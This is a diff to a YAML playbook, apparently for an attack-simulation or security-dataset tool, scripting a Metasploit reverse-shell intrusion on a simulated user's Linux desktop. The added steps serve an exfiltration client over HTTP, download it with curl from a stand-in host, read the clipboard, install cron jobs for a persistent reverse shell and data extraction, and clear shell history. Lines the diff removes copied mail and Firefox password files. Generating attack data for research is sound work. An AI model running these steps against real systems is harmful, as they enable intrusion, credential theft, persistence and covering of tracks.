@@ -56,6 +56,14 @@ commands:
     background: true
     kill_on_exit: true
 
+################### SERVE VEILTRANSFER CLIENT ############################
+
+  # serve payload via http
+  - type: webserv
+    local_path: /home/aecid/VeilTransfer/veiltransfer_client_linux
+    port: 8082
+    background: True
+
 ################### CLIENT OPENS DOCUMENT ############################
 
   - type: vnc
@@ -127,6 +135,10 @@ commands:
     key: "enter"
     session: client
 
+
+  - type: sleep
+    seconds: 3
+
 ################### ATTACKER INTERACTS WITH METERPRETER ############################
   # run commands via reverse shell
   - type: msf-session
@@ -136,29 +148,17 @@ commands:
 
 ################### PERSISTENCE OPTION A, CRON JOB ############################
 
- # upload cronjob
+ # upload cronjob that establishes reverse shell
   - type: msf-session
     session: revshell
     cmd: upload crontab.txt
 
- # upload cronjob
+ # upload cronjob that extracts data
   - type: msf-session
     session: revshell
     cmd: upload downloader.txt
 
-
- # upload veiltransfer-client
-  - type: msf-session
-    session: revshell
-    cmd: upload /home/aecid/VeilTransfer/veiltransfer_client_linux /home/judy/.local/bin
-
-
 ################### ATTACKER GATHERS INFORMATION ############################
-
- # download Emails
- # - type: msf-session
- #   session: revshell
- #   cmd: download /home/judy/.thunderbird/user.default-release/Mail/'Local Folders'/Inbox
 
  # get interactive shell
   - type: msf-session
@@ -185,73 +185,44 @@ commands:
     cmd: export DISPLAY=:0
     session: revshell
 
+  # download the veiltransfer_client_linux executable
   - type: msf-session
-    cmd: export PROFILE=$(basename /home/judy/.mozilla/firefox/*.dev-edition-default | cut -d"." -f1)
+    cmd: curl -o /home/judy/.local/bin/veiltransfer_client_linux suspicious-website.com:8082/index
     session: revshell
 
+   # get the last clipboard entry
   - type: msf-session
-    cmd: echo $PROFILE
     session: revshell
-
-#  - type: setvar
-#    cmd: $RESULT_STDOUT
-#    variable: FIREFOXPROFILE
-#
-#  - type: debug
-#    cmd: firefox profile $FIREFOXPROFILE
- 
- 
-
+    cmd: xclip -selection clipboard -o
 
 # make the veiltransfer client binary executable
   - type: msf-session
     session: revshell
-    cmd: chmod +x /home/judy/.local/bin/veiltransfer_client_linux && sleep 5
+    cmd: chmod +x /home/judy/.local/bin/veiltransfer_client_linux 
 
   # add the persistence cronjob
   - type: msf-session
-    session: revshell
+    session: revshell 
     cmd: crontab /home/judy/crontab.txt
-
-  # get the last clipboard entry
-  - type: msf-session
-    session: revshell
-    cmd: xclip -selection clipboard -o
 
   # add the cronjob to extract data
   - type: msf-session
     session: revshell
     cmd: (crontab -l; cat /home/judy/downloader.txt) | crontab -
 
-#  # send the emails via veiltransfer
-#  - type: msf-session
-#    session: revshell
-#    cmd: veiltransfer_client_linux transfer quic -localPath /home/judy/.thunderbird/user.default-release/Mail/'Local Folders'/Inbox
+  # find out which windown are open
+  - type: msf-session
+    session: revshell
+    cmd:  wmctrl -l
 
   # exit the interactive shell
   - type: msf-session
     session: revshell
     cmd: exit
 
-# # extract firefox session store
-#  - type: msf-session
-#    session: revshell
-#    cmd: download /home/judy/.mozilla/firefox/$FIREFOXPROFILE.dev-edition-default/sessionstore-backups/recovery.jsonlz4
-#
-# # extract firefox password decryption keys
-#  - type: msf-session
-#    session: revshell
-#    cmd: download /home/judy/.mozilla/firefox/$FIREFOXPROFILEPROFILE.dev-edition-default/key4.db
-#
-# # extract firefox passwords
-#  - type: msf-session
-#    session: revshell
-#    cmd: download /home/judy/.mozilla/firefox/$FIREFOXPROFILEPROFILE.dev-edition-default/logins.json
-
-#
-#  # 
-#  - type: msf-session
-#    session: revshell
-#    cmd: 
+      # clear history
+  - type: msf-session
+    session: revshell
+    cmd: history -c
 
 
